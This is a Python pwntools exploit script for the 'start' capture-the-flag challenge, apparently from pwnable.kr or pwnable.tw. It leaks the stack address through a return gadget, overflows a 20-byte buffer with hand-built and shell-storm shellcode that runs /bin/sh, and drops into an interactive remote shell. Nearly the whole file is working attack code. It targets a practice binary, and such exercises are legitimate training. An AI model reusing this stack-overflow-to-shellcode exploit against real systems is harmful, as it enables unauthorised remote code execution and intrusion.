#!/usr/bin/python3
# coding=utf-8
# __author__:TaQini

from pwn import *
import socket
import sys
import re

local_file = './start'
local_libc = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc  # '../libc.so.6'

is_local = False
is_remote = False
is_argv=True #是否带参运行
#data_final= #参数

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
    elf = ELF(local_file)
elif len(sys.argv) > 1:
    is_remote = True
    if sys.argv[1] == 'ssh':
        username, host = sys.argv[2].split('@')
        port = int(sys.argv[3])
        password = sys.argv[4]
        sh = ssh(username, host, port, password)
        if is_argv==True:
            p=sh.process(argv=[local_file,'24','/dev/stdin'])
        else:
            p = sh.process(local_file)
        #elf = ELF(local_file)
    elif sys.argv[1] == 'nc':
        conn = remote(sys.argv[2], sys.argv[3])
    elif sys.argv[1]=='local':
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("pwnable.kr",9007))
    else:
        # len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
        p = remote(host, port)
        libc = ELF(remote_libc)

    '''else:
        host, port = sys.argv[1].split(':')'''


#elf = ELF(local_file)

context.log_level = 'debug'
#context.arch = elf.arch


def se(data): return p.send(data)
def sa(delim, data): return p.sendafter(delim, data)
def sl(data): return p.sendline(data)


def sla(delim, data): return p.sendlineafter(delim, data)
def sea(delim, data): return p.sendafter(delim, data)
def rc(numb=4096): return p.recv(numb)
def ru(delims, drop=True): return p.recvuntil(delims, drop)
def uu32(data): return u32(data.ljust(4, '\0'))
def uu64(data): return u64(data.ljust(8, '\0'))
def info_addr(tag, addr): return p.info(tag + ': {:#x}'.format(addr))

'''def debug(cmd=''):
    if is_local:
        attach(p, cmd)'''


# info
def leak_esp(conn):
	address_1 = p32(0x08048087)             # mov ecx, esp; mov dl, 0x14; mov bl, 1; mov al, 4; int 0x80; 
	payload = b'A'*20 + address_1
	print (conn.recvuntil('CTF:'))
	conn.send(payload)
	esp = u32(conn.recv()[:4])
	print ("Address of ESP: ", hex(esp))
	return esp
# rop1s

shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

esp=leak_esp(conn)
payload=b'A'*20+p32(esp+20)

#这个shellcode不起作用http://shell-storm.org/shellcode/files/shellcode-599.php
#payload+=b"\x6a\x17\x58\x31\xdb\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"
#http://shell-storm.org/shellcode/files/shellcode-811.php
payload+=b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"


print(payload)


conn.sendline(payload)

conn.interactive()

# debug()


# system()地址 + 命令字符串地址
